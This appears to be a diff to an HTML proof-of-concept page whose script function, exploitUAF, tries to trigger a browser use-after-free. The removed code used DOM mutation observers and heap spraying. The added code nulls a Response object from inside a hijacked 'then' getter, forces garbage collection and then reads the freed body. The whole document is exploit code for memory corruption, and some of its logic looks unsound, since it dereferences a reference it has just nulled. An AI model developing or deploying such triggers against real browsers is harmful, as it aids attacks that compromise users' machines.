@@ -3,26 +3,33 @@
 <head>
     <script>
         function exploitUAF() {
-            let node = document.createElement("div");
-            document.body.appendChild(node);
+            let blob = new Blob([], { type: 'application/octet-stream' });
+            let formData = new FormData();
+            formData.append('emptyBlob', blob);
 
-            let observer = new MutationObserver(() => {
+            let response = new Response(formData);
+            Object.defineProperty(response, 'then', {
+                get: function() {
+                    response = null;
+                    if (typeof gc === "function") gc();
+                    return undefined;
+                }
+            });
+
+            response.arrayBuffer().then(() => {
                 try {
-                    let cached = document.querySelector("div");
-                    console.log(cached.innerHTML);
+                    let consumer = response.body.getReader();
+                    consumer.read().then(() => {
+                        console.log("Attempting access after GC");
+                    }).catch(e => {
+                        console.error(e.message);
+                        alert(e.message);
+                    });
                 } catch (e) {
                     console.error(e.message);
                     alert(e.message);
                 }
             });
-
-            observer.observe(document.body, { childList: true, subtree: true });
-            document.body.removeChild(node); // تعديل أثناء الملاحظة
-            let memoryHog = new Array(10000);
-            for (let i = 0; i < 10000; i++) {
-                memoryHog[i] = new Uint8Array(2048);
-            }
-            if (typeof gc === "function") gc();
         }
     </script>
 </head>
